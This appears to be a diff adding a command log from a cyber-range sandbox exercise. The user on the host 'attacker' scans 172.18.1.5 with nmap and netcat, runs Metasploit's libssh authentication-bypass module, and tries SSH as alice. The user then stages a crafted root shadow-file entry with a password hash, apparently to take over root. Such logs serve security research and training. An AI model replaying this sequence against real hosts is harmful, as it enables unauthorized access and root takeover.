@@ -1,0 +1,31 @@
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:31:43.046234Z","hostname":"attacker","cmd":"nmap -v -sn 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:33:02.977928Z","hostname":"attacker","cmd":"nmap 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:35:11.301899Z","hostname":"attacker","cmd":"nmap 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:38:01.355822Z","hostname":"attacker","cmd":"ipconf","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:41:03.959231Z","hostname":"attacker","cmd":"nmap -p 1337-sV 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:41:21.548238Z","hostname":"attacker","cmd":"nmap -p 1337 -sV 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:44:43.588719Z","hostname":"attacker","cmd":"msf5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:47:40.901854Z","hostname":"attacker","cmd":"msfconsole ","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:51:16.995501Z","hostname":"attacker","cmd":"nc 172.18.1.5 22 ","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:51:34.729961Z","hostname":"attacker","cmd":"nc 172.18.1.5 1337","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:51:55.588939Z","hostname":"attacker","cmd":"nmap -sV 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:53:30.500251Z","hostname":"attacker","cmd":"nmap -sV 172.18.1.5 22","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:53:41.426436Z","hostname":"attacker","cmd":"nc 172.18.1.5 22","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:58:05.340364Z","hostname":"attacker","cmd":"set RHOST 172.18.1.5","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T10:58:23.200146Z","hostname":"attacker","cmd":"set RPORT 23","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:02:47.073734Z","hostname":"attacker","cmd":"use auxiliary(scanner/ssh/libssh_ath_bypass) > options","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:03:06.957035Z","hostname":"attacker","cmd":"use auxiliary/scanner/ssh/libssh_auth_bypass > options","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:03:22.531216Z","hostname":"attacker","cmd":"options ","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:02.035750Z","hostname":"attacker","cmd":"set LHOST 172.18.1.5","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:05.107769Z","hostname":"attacker","cmd":"options ","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:23.421672Z","hostname":"attacker","cmd":"set RHOST 172.18.1.5","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:26.022633Z","hostname":"attacker","cmd":"options ","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:37.904777Z","hostname":"attacker","cmd":"set RHOSTS 172.18.1.5","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:40.154511Z","hostname":"attacker","cmd":"options ","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:04:43.489874Z","hostname":"attacker","cmd":"run","ip":"10.0.135.83"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:08:13.203756Z","hostname":"attacker","cmd":"ssh alice@172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:36:55.975405Z","hostname":"attacker","cmd":"NEWPASSWD='root:$1$xyz$NpfAWIDYQurUeFv80XTXr1:17861:0:99999:7:::'","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:39:36.827779Z","hostname":"attacker","cmd":"NEWPASSWD='root:$1$xyz$NpfAWIDYQurUeFv80XTXr1:17861:0:99999:7:::'","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T11:39:45.524992Z","hostname":"attacker","cmd":"echo $XDISPLAY","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T15:10:32.319164Z","hostname":"attacker","cmd":"ssh alice@172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"148","timestamp_str":"2019-09-19T15:10:56.680638Z","hostname":"attacker","cmd":"ssh alice@172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
